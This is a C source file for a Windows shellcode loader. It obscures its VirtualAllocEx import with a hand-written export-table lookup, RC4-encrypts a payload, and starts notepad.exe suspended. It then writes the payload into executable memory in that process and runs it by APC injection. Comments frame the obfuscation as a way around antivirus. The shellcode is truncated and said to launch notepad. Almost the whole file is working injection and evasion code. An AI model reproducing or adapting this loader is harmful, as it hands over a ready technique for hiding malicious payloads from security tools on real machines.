#include <windows.h>
#include <stdio.h>
#include "ProcessCreation.h"
#include "PayloadInjection.h"
#include "RC4Encryption.h"

// Typedef for VirtualAllocEx function pointer
typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

// Custom function to replace GetProcAddress (for IAT obfuscation)
FARPROC GetProcAddressReplacement(HMODULE hModule, LPCSTR lpApiName) {
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;

    // Check DOS signature
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

    // Check NT signature
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // Get Export Directory
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Retrieve function names, addresses, and ordinals
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    // Loop through exported functions and find the requested API
    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        LPCSTR pFuncName = (LPCSTR)(pBase + FunctionNameArray[i]);
        if (strcmp(pFuncName, lpApiName) == 0) {
            WORD ordinal = FunctionOrdinalArray[i];
            DWORD funcRVA = FunctionAddressArray[ordinal];
            return (FARPROC)(pBase + funcRVA);
        }
    }
    return NULL;
}

unsigned char payload[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
    // (truncated shellcode for launching notepad.exe)
};

unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key

int main() {
    DWORD processId;
    HANDLE hProcess, hThread;

    // Step 1: Encrypt the payload using RC4 at runtime
    printf("[*] Starting payload encryption...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));  // Encrypt the shellcode
    printf("[+] Payload encrypted successfully.\n");

    // Step 2: Create a suspended process (Notepad)
    printf("[*] Attempting to create a suspended process (notepad.exe)...\n");
    if (!CreateSuspendedProcess("notepad.exe", &processId, &hProcess, &hThread)) {
        printf("[!] Failed to create suspended process (AV block or error). Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Process created successfully with PID: %d.\n", processId);

    // Step 3: Decrypt the encrypted payload before injecting it
    printf("[*] Decrypting the encrypted payload...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));  // Decrypt the shellcode
    printf("[+] Payload decrypted successfully.\n");

    // Step 4: Use the obfuscated VirtualAllocEx
    printf("[*] Dynamically loading VirtualAllocEx...\n");
    HMODULE hKernel32 = GetModuleHandleA("KERNEL32.DLL");

    // Use the typedef to define a function pointer for VirtualAllocEx
    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressReplacement(hKernel32, "VirtualAllocEx");

    if (!pVirtualAllocEx) {
        printf("[!] Failed to retrieve VirtualAllocEx. Error Code: %lu\n", GetLastError());
        return -1;
    }

    // Step 5: Inject the decrypted payload into the suspended process using VirtualAllocEx
    printf("[*] Injecting decrypted payload into the process...\n");
    LPVOID lpBaseAddress = pVirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpBaseAddress) {
        printf("[!] Memory allocation failed using VirtualAllocEx. Error Code: %lu\n", GetLastError());
        return -1;
    }

    if (!WriteProcessMemory(hProcess, lpBaseAddress, payload, sizeof(payload), NULL)) {
        printf("[!] Payload injection failed. Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Payload injected at base address: 0x%p.\n", lpBaseAddress);

    // Step 6: Queue the payload for execution using APC injection
    printf("[*] Queuing the payload using APC injection...\n");
    if (!QueuePayloadAPC(hThread, lpBaseAddress)) {
        printf("[!] Failed to queue payload for APC injection. Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Payload successfully queued for APC injection.\n");

    // Step 7: Resume the thread to execute the payload
    printf("[*] Resuming the thread to execute the payload...\n");
    if (ResumeThread(hThread) == -1) {
        printf("[!] Failed to resume thread. Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Thread resumed successfully, payload should now execute.\n");

    return 0;
}
